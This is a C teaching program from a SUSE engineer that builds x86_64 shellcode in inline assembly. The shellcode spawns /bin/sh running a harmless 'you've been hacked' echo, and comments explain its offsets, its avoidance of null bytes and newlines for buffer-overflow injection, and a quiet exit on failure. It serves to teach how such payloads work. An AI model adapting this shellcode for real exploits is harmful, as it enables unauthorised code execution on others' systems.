/*
 * Matthias Gerstner
 * SUSE Linux GmbH
 * matthias.gerstner@suse.com
 *
 * This program sets up an execve() system call to run /bin/sh with empty
 * environment and a call to "echo \"you've been hacked\"". This is done using
 * inline assembly and the x86_64 syscall instruction.
 *
 * A more complex variant of exec_snippet
 */

/*
 *  This program modifies the .text segment (i.e. the code modifies itself)
 *  which is not allowed by default.
 *
 *  This happens only for demonstration purposes to test the assembler code so
 *  bypassing this restriction is not really relevant for the security exploit
 *  in practice.
 *
 *  To get this code to work for testing we can modify the page protection
 *  during runtime with mprotect() or link with writable text segments.
 *
 *  The ld option -N recently started producing a linker error with
 *  __ehdr_start being undefined. It seems to have to do with the GOT/PLT
 *  table being generated and requiring dynamic linking. Therefore we use the
 *  mprotect approach now.
 */
#define USE_MPROTECT

#ifdef USE_MPROTECT

#	include <sys/mman.h>
#	include <stdint.h>

static void makeTextWritable(void *mainptr) {
	// mark main() code writable during runtime, alternative to linking
	// with -Wl-N and statically
	intptr_t addr = (intptr_t)mainptr;
	// round down to the page size boundary
	addr = addr & (~(intptr_t)(4096-1));
	// allow all operations on the code
	mprotect((void*)addr, 4096, PROT_READ | PROT_WRITE | PROT_EXEC);
}

#endif // USE_MPROTECT

int main() {
#ifdef USE_MPROTECT
	makeTextWritable(&main);
#endif

	/*
	 * the execve(2) system call takes the following parameters:
	 *
	 * rax: the system call number 0x3b
	 * rdi: a pointer to the string representing the path to the
	 *     program to execute
	 * rsi: a pointer to the argument list (char **) terminated with a
	 *     NULL pointer
	 * rdx: a pointer to the environment list (char **) terminated with a
	 *     NULL pointer
	 */

	__asm__(
		// jump to the call instruction, which will get the stack
		// address to use for our exec() parameter addressing.
		//
		// the offset to jump to needs to be calculated from the
		// length of the assembler instructions or by disassembling
	        "jmp . + 0x4b\n"                    // 2 bytes
		// retrieve the return address from the stack into %rbx
		"popq   %rbx\n"                     // 1 byte
		// write the address of the /bin/sh string just after the
		// last parameter to serve as argv[] list to execve()
		"movq   %rbx,0x37(%rbx)\n"           // 4 bytes
		// same for the other addresses
		"leaq   0x9(%rbx),%rcx\n"            // 4 bytes
		"movq   %rcx,0x3f(%rbx)\n"           // 4 bytes
		"leaq   0xc(%rbx),%rcx\n"            // 4 bytes
		"movq   %rcx,0x47(%rbx)\n"           // 4 bytes
		// make sure the /bin/sh string is null terminated (could have
		// been skipped in case of strcpy() based overflow or other \0
		// based string copy functions)
		"movb   $0x0,0x7(%rbx)\n"           // 4 bytes = 0x1b bytes
		// same for the other two parameters
		"movb   $0x0,0x0b(%rbx)\n"           // 4 bytes
		"movb   $0x0,0x25(%rbx)\n"           // 4 bytes 
		// provide a null pointer terminator for the argv[] and envp[]
		// list to execve()
		"movq   $0x0,0x4f(%rbx)\n"          // 8 bytes
		// setup the execve() parameters
		//
		// system call number
		"movq   $0x3b,%rax\n"               // 7 bytes = 0x32 bytes
		// the address of the /bin/sh string to execute
		"movq   %rbx,%rdi\n"                // 3 bytes
		// the address of the address of the /bin/sh string and a
		// following NULL terminator to serve as a parameter list
		"leaq   0x37(%rbx),%rsi\n"                // 4 bytes
		// terminating NULL pointer for the environment list
		"leaq   0x4f(%rbx),%rdx\n"          // 4 bytes
		// execute the system call
		"syscall\n"                         // 2 bytes = 0x3f bytes
		// fallback code if execve() should fail: exit with 0
		// thus we keep a low profile, user/administrator might wonder
		// why the program exited but there will be no visible crash
		"movq   %rax, %rbx\n"               // 4 bytes
		"movq   $0x1, %rax\n"               // 7 bytes
		"int    $0x80\n"                    // 2 bytes = 0x4f bytes
		// jump back to the pop code, this will put the return address
		// (the address to the exec string parameter!) onto the stack
		"call   . - 0x49\n"                 // 5 bytes
		// added a dummy X character to change the offsets a bit,
		// otherwise we'd have an 0xa offset which is '\n' and a
		// terminator for some line based functions
		".string \"/bin/shX\"\n"             // 8 bytes = 0x5c bytes
		".string \"-c\"\n"                  // 4 bytes
		".string \"echo \\\"you've been hacked\\\"\"\n" // 26 bytes = 0x7a bytes
	);
}

